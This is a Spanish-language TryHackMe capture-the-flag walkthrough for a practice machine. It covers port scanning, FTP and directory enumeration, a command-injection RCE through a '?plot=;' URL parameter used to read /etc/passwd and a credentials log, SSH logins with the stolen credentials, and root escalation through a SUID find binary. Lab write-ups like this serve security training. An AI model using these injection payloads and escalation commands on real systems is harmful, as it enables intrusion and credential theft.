Bienvenidos a otra sala de TryHackMe. Tenemos una maquina de dificultad media en la que escanearmos puertos abiertos con nuestra herramienta bien conocida. La enumeracion es clave, el mensaje de esta maquina, tenemos que ver muchas rutas donde nos topamos con una vulnerabilidad RCE y podemos secuestrar las credenciales del usuario y establecer una conexion ssh para luego movernos entre usuario y escalar privilegios abusandonos del permiso /find.

# Recon

Iniciamos nuestro reconocimiento utilizando __nmap__. Le diremos que escanee todos los puertos abiertos, con una tasa de paquetes de 5000, en modo sigiloso sin activar las alertas de seguridad y haciendo el escaneo mas rapido, tambien le diremos que no compruebe si el objetivo este en linea, que no resuelva los nombres del host durante el escaneo evitando que los servidores __DNS__ registren el escaneo y haciendo el escaneo mucho mas rapido, tambien que nos muestre la version del servicio, y lo resuelva todo en modo agresivo "__T4__", usamos verbose para ver el progreso del escaneo y que guarde todo el proceso en formato normal, para luego poder echarle un vistazo siempre que querramos. Ejecutaremos nuestro comando : `sudo nmap  -p- --open --min-rate 5000 -sS -Pn -n -sV -T4 -vvv IPTARGET -oN nmap`

```ruby
# Nmap 7.80 scan initiated Fri Jul  7 07:52:28 2023 as: nmap -p- --open --min-rate=5000 -sS -sV -Pn -T4- -vvv -oN nmap n 10.10.208.19
Failed to resolve "n".
Nmap scan report for IPTARGET
Host is up, received user-set (0.23s latency).
Scanned at 2023-07-07 07:52:29 EDT for 52s
Not shown: 65531 closed ports
Reason: 65531 resets
PORT      STATE SERVICE REASON         VERSION
21/tcp    open  ftp     syn-ack ttl 63 vsftpd 3.0.3
80/tcp    open  http    syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
10000/tcp open  http    syn-ack ttl 63 MiniServ 1.930 (Webmin httpd)
55007/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
```

Nuestro escaneo de nmap nos muestra 4 puertos abiertos. Iniciaremos la enumeracon estableciendo una conexion al puerto ftp (21) que nos marca nuestro escaneo de nmap. Recordemos que podemos entrar usando el usuario Anonymous sin necesidad de password.

```bash
ftp IPTARGET

ftp> ls -lah # Listamos archivos ocultos en el servicio
229 Entering Extended Passive Mode (|||43770|)
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Aug 22  2019 .
drwxr-xr-x    2 ftp      ftp          4096 Aug 22  2019 ..
-rw-r--r--    1 ftp      ftp            74 Aug 21  2019 .info.txt

ftp> more .info.txt # Miramos el contenido del archivo txt
Whfg jnagrq gb frr vs lbh svaq vg. Yby. Erzrzore: Rahzrengvba vf gur xrl!
```

Obtenemos un texto codificado. Para descifrarlo, nos dirigmos a http://cyberchef.org y utilizamos la receta de **Vigenere decode** con la palabra clave "n".
`Just wanted to see if you find it. Lol. Remember: Enumeration is the key!`

Iniciamos la busqueda de directorios ocultos dentro del servidor web con gobuster.

```bash
gobuster dir -u http://IPTARGET -w /Path/Wordlist -t 100


```

Encontramos el directorio /joomla. Al navegar al servidor web, podemos investiar en busca de alguna version o CMS que nos interese , pero no encontre nada. Volviendo al mensaje anterior que descubrimos, lanze otra busqueda de directorios dentro de /joomla.

```bash
gobuster dir -u http://IPTARGET/joomla -w /Path/Wordlist -t 100

=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://IPTARGETjoomla/
[+] Threads      : 100
[+] Wordlist     : /usr/share/dirb/wordlists/big.txt
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 10s
=====================================================
2023/07/07 08:02:35 Starting gobuster
=====================================================
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/_archive (Status: 301)
/_database (Status: 301)
/_files (Status: 301)
/_test (Status: 301)
/administrator (Status: 301)
/bin (Status: 301)
/build (Status: 301)
/cache (Status: 301)
/cli (Status: 301)
/components (Status: 301)
/images (Status: 301)
/includes (Status: 301)
/installation (Status: 301)
/language (Status: 301)
/layouts (Status: 301)
/libraries (Status: 301)
/media (Status: 301)
/modules (Status: 301)
/plugins (Status: 301)
/templates (Status: 301)
/tests (Status: 301)
/tmp (Status: 301)
/~www (Status: 301)
=====================================================
2023/07/07 08:03:31 Finished
=====================================================
```

Ivestigamos cada uno de los directorios en busca de alguna vulnerabilidad que nos permita acceder desde nuestra maquina atacante a su sistema. 
Van a haber muchas trampas o whole rabbits, como en este ejemplo a continuacion :

Dentro del directorio _database podemos encontrar otro texto que si lo descriframos utilizando nuevamente cyberchef con receta vigenere decode y la letra clave "n" nos muestra un texto que no nos llevara a ninguna parte.

```bash
Lwuv oguukpi ctqwpf.
Just messing around.
```

# Intrusion

Una vez localizado nuestro directorio que contiene la vulnerabilidad, realizamos una busqueda por internet que nos indique como nos podemos abusar de esta brecha. 
https://www.exploit-db.com/exploits/47204 nos indica que podemos utilizar RCE para ejecutar comandos dentro del servidor web. 


Ejecutamos una linea de comandos, que nos verificara dentro del sistema para corroborar que el RCE sea funcional, haremos una breve enumeracion para saber que usuarios hay en el sistema y listaremos algunos directorios del cual obtenemos un arhivo log.txt que nos dara las credenciales para establecer una conexion ssh.

Cabe aclarar, que cuando ejecutemos el comando, tendremos que dirigirnos al apartado de **Select_host** y observar que nos infique el contenido del comando que ejecutamos.

```bash
http://IPTARGET/_test/?plot=;whoami # Verificamos que funciona y observamos nuestro id

http://IPTARGET/_test/?plot=;cat /etc/passwd # Enumeramos usuarios del sistema

http://IPTARGET/_test/?plot=;pwd # Observamos la ruta

http://IPTARGET/_test/?plot=;ls -lah # listamos directorio incluido archivos ocultos

http://IPTARGET/_test/?plot=;cat log.txt # Miramos el contenido y robamos las credenciales

http://IPTARGET/_test/?plot=;which python # Veremos si existe python en el sistema

http://IPTARGET/_test/?plot=;python3 -m http.server 8080 # Abrimos servidor http en python para transferir archivos

# Desde nuestra maquina atacante nos pasamos el archivo del ultimo comando

wget http://IPTARGET:8080/log.txt
```

Una vez obtenidas las credenciales, pasamos a establecer una conexion ssh en el puerto que nos mostro el escaneo de nmap anteriormente.

```bash
ssh basterd@IPTARGET -p 55007
```

Dentro del directorio de basterd, encontramos un archivo `backup.sh` que nos muestra las credenciales del otro usuario en el sistema, establecemos una conexion ssh a este usuario.

```bash
cat backup.sh

REMOTE=1.2.3.4
SOURCE=/home/stoner
TARGET=/usr/local/backup
LOG=/home/stoner/bck.log
DATE=`date +%y\.%m\.%d\.`
USER=stoner
#REDACTED

ssh stoner@IPTARGET -p 55007
```

# Priv.Escalation

Buscamos permisos elevados dentro del sistema: 

```bash
find / -type f -perm -4000 -ls 2>/dev/null

-rwsr-xr-x   1 root     root          36288 Mar 26  2019 /usr/bin/newgidmap
-r-sr-xr-x   1 root     root         232196 Feb  8  2016 '/usr/bin/find'
-rwsr-sr-x   1 daemon   daemon        50748 Jan 15  2016 /usr/bin/at
-rwsr-xr-x   1 root     root          39560 Mar 26  2019 /usr/bin/chsh
-rwsr-xr-x   1 root     root          74280 Mar 26  2019 /usr/bin/chfn
-rwsr-xr-x   1 root     root          53128 Mar 26  2019 /usr/bin/passwd
-rwsr-xr-x   1 root     root          34680 Mar 26  2019 /usr/bin/newgrp
-rwsr-xr-x   1 root     root         159852 Jun 11  2019 /usr/bin/sudo
-rwsr-xr-x   1 root     root          18216 Mar 27  2019 /usr/bin/pkexec

```

Escalamos privilegios utilizando /find. Nos dirigimos a /usr/bin y ejecutamos:

```bash
./find . -exec /bin/sh -p \; -quit
```

Informacion obtenido de https://gtfobins.github.io/gtfobins/find/


